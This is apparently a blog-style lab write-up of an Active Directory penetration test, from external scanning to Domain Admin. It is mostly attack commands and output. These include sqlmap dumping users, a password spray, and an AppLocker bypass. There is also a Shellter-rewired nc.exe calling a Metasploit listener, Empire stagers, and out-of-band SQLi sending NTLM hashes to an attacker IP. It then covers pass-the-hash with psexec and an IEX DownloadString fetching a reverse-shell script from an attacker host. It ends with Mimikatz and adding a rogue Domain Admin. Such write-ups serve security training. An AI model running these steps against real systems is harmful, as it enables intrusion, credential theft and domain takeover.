---
layout: post
title: Active Dirctory Adventures part 1
---

Windows Active Directory is a database of network reasorce objects. That proliferates in modern enterprise network architectures.
This post is about going from external client to Domain Controller using some fun tools and tricks.

There is a firewall in place so we scan some likely ports with the no ping (-Pn) option and add increased speed (-T4) and version detection (-sV)


`nmap -T4 -sV -Pn -p80,443 10.7.12.0/24`

![](https://braaaax.github.io/braaaax.github.io/images/lky-nmap.jpg)

We bust the http ports for available directories and find on on 10.7.12.12/mvc, a sales site and uses a backend database to manage its merchandise information.

![](https://braaaax.github.io/braaaax.github.io/images/lky-site.jpg)


The url shows an aspx script that makes a call to the databse to retrieve product information.
We capture the request with Burp Suite and probe this injection point with sqlmap.

![](https://braaaax.github.io/braaaax.github.io/images/lky-mvc-web-req.jpg)

We can use the copy to file function and write the request to procuct.req and then sick sqlmap on it.


`sqlmap -r product.req --level=5 --risk=3`

This proves successful and we are able to dump the entire database. 
Of interest is a table giving Active Directory users fullnames and their respective groups

```

Database: ADConnect
Table: ADUsers
[40 entries]
+------------+-------------+-----------------+
| LastName   | FirstName   | Department      |
+------------+-------------+-----------------+
| Vazquez    | Annie       | Finance         |
| Falcon     | Paul        | Finance         |
| Anthony    | Fae         | Finance         |
| Dillard    | Walter      | Finance         |
| Bradford   | Louis       | Finance         |
| Gage       | Sonya       | Finance         |
| Sanchez    | Alba        | Finance         |
| Branch     | Daniel      | Finance         |
| Cruz       | Christopher | Finance         |
| Johnson    | Nicole      | Finance         |
| Holliday   | Mary        | Human Resources |
| Shoemaker  | Michael     | Human Resources |
| Slater     | Arlene      | Human Resources |
| Prentiss   | Kelsey      | Human Resources |
| Davis      | Ginger      | Human Resources |
| McDaniel   | Johnny      | Human Resources |
| Jones      | James       | Human Resources |
| Garcia     | Thomas      | Human Resources |
| Harrison   | Melissa     | Human Resources |
| Hight      | Nicholas    | Human Resources |
| Baird      | William     | Marketing       |
| Ochoa      | Michelle    | Marketing       |
| Hopkins    | Joshua      | Marketing       |
| Blea       | Howard      | Marketing       |
| Pennington | Clara       | Marketing       |
| Glen       | David       | Marketing       |
| Hartsfield | Kim         | Marketing       |
| Ramirez    | Rita        | Marketing       |
| Hafner     | Opal        | Marketing       |
| Matthews   | Louie       | Marketing       |
| Okeefe     | Lee         | Sales           |
| Burrows    | Roger       | Sales           |
| Steele     | Charles     | Sales           |
| Wallace    | Juan        | Sales           |
| Lewis      | Donita      | Sales           |
| Santiago   | Juanita     | Sales           |
| Shepherd   | Wesley      | Sales           |
| Brown      | Steven      | Sales           |
| Wilson     | Johnny      | Sales           |
| May        | Juan        | Sales           |
+------------+-------------+-----------------+

```

Dirbusting the other open http/s ports we find /rdweb access ie remote dsktop web access. 
If we can derive the correct username given the full names of the AD users we can test weak passwords with the rdweb login.

![](https://braaaax.github.io/braaaax.github.io/images/lky-rdweb-login.jpg)

For this one can use a tool like burp intruder:
enter "LAB/USERNAME" and "PASSWORD" into the login field and capture with burp/zap proxy:


Intruder: 
*  you can use the "cluster bomb" attack
*  remove the placeholders save for the the two USERNAME fields and the the PASSWORD field
*  we are relating payloads to a given placeholder here so use the userlist you created for placeholder1 and copy that lost for paload 2 and use a password list for payload 3
*  make sure to Always Follow Redirection in the options tab


![](https://braaaax.github.io/braaaax.github.io/images/lky-burp-intruder.jpg)


```python

import csv
with open("/root/.sqlmap/output/10.7.12.12/dump/ADConnect/ADUsers.csv") as csvfile:
    reader = csv.DictReader(csvfile)
    for row in reader:
        print('{}{}'.format(row['FirstName'][0].lower(), row['LastName'].lower()))

```

Passords List:
Summer2017!
Winter2017!
Fall2017!
Spring2017!
Summer2018!
Winter2018!
Fall2018!
Spring2018!


User Credentials Found:
avazquez:Spring2017!
mholliday:Summer2017!
wbaird:Autum2017!

We attempt a login with LAB\avazquez, and success!
![](https://braaaax.github.io/braaaax.github.io/images/lky-valid-login.jpg)

We don't want the rdweb and its two applications, we want the full experience. So we log into Annie's account with remmina.
![](https://braaaax.github.io/braaaax.github.io/images/lkys-remmina.jpg)


We can see Windows Defender and Applocker are preventing us from executing most things (Applocker includes AMSI). Pasting the contents of [applocker-bypass-checker.ps1](https://github.com/barryclark/jekyll-now) into notepad and saving as a .ps1 file allows us to sidestepp Defender momentarilly. Running shows us the \windows\Tasks, \windows\tracing\, \windows\system32\spool\drivers\color allow "BUILTIN\USERS" write/createFiles & execute auth.

![](https://braaaax.github.io/braaaax.github.io/images/lky-Applocker-Bypass.png)

![](https://braaaax.github.io/braaaax.github.io/images/lky-constrained-PS.png)

![](https://braaaax.github.io/braaaax.github.io/images/lky-powershdll.png)

We use Shellter to trick Applocker further by "rewiring" nc.exe to call to a waiting metasploit listener. 

![](https://braaaax.github.io/braaaax.github.io/images/lky-brax-exe.png)
![](https://braaaax.github.io/braaaax.github.io/images/lky-msf-01.png)

Going from msf to empire (via Chryzsh):
In Empire:
create a default http listener named "http"
*  uselistener http
*  set Host 10.7.253.10
*  set Port 4444
*  execute

create copy launcher, created w/o base64
*  back
*  usestager multi/launcher
*  set Base64 false
*  generate

In MSF:
*  load powershell
*  powershell_shell
*  paste listener and execute await agent in empire

With empire we can enumerate the system easilly:

>ComputerName
>------------
>DC01
>WS03
>FS01
>MX01
>WEB01
>WS05
>RDS02
>SQL01



Discover a helpful VPN to facilitate internal access to the interior subnet to avoid lots of proxies. Alternative methods would be to use Inveigh.
`//FS01.lab.local/GroupData/LabUserVPN.ovpn`



Out of band SQLi
We have an injection point from step one. To prompt the hash of the owner of the sql db to be sent to responder we need to instigat a DNS query to our IP. We are requesting data be sent via HTML, SMB, or DNS. With MSSQL we use `master..xp_dirtree` (MySQL: LOAD_FILE()). Supplying a hostname to these functions will cause a DNS lookup to occur. We're not interested in successful transmission of the information but the target user with send their netNTLMv2 hash along with their request to our machine. [Futher Reading] (https://www.gracefulsecurity.com/sql-injection-out-of-band-exploitation/)

```
/mvc/Product.aspx?ProductSubCategoryId=18;declare @q varchar(99);set @q='\\10.8.254.14\test1'; exec master.dbo.xp_dirtree @q
/mvc/Product.aspx?ProductSubCategoryId=18;declare%20@q%20varchar(99);set%20@q=%27\\10.8.254.14\test1%27;%20exec%20master.dbo.xp_dirtree%20@q
```


We can use responder and ntlnrelayx to dump hashes
`./Responder.py -I tun1 -wrf` 
  -disable http/s and smb
`./ntlmrelayx.py -tf ~/lkys37en-lab/labnotes/targets.txt`


`./psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e8bcd502fbbdcd9379305dca15f4854e administrator@10.8.14.14`

Impacket v0.9.16-dev - Copyright 2002-2018 Core Security Technologies

```
[*] Requesting shares on 10.8.14.14.....
[*] Found writable share ADMIN$
[*] Uploading file JkqJuZDF.exe
[*] Opening SVCManager on 10.8.14.14.....
[*] Creating service HPPN on 10.8.14.14.....
[*] Starting service HPPN.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

System on sql01 then use token impersonation to get to bdavis

GPO Enumeration:
`Get Group Policy Objects`

`Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}`

`Get-NetGPO -DisplayName MailServer-Config | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}`

`Get-NetOU -GUID "{2259E5B0-3B49-4704-98BB-5A9581B54E8E}" | %{Get-NetComputer -ADSpath $_}`

Add "Server Admins" to the below file

`type "\\lab.local\sysvol\lab.local\Policies\{2259E5B0-3B49-4704-98BB-5A9581B54E8E}\MACHINE\Preferences\Groups\Groups.xml"`

`Invoke-GpUpdate -Computer MX01 -Force`

Since BDavis is a user on MX01 we can move laterally via Invoke-Command or just run Mimikatz on the Box.

`Invoke-Command -ComputerName MX01 -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://10.8.254.10/Invoke-PowerShellTcpOneLine.ps1')}`

`Invoke-Command -ComputerName MX01 -ScriptBlock {.\Invoke-Mimikatz.ps1)}`

We get NTLM hashes for BRoss, who is a Domain Admin. With this info we are able to use the Ross account to add us to net users and Domain Admins
We use cme to expoit the hashes and get a shell.


![](https://braaaax.github.io/braaaax.github.io/images/lky-cme-screenshot.png)


Adding myself to all the good places:
`net user brax password /add /domain`

`net group "Domain Admins" /add brax /domain`

`net group "Remote Desktop Users" /add lab\brax /domain`

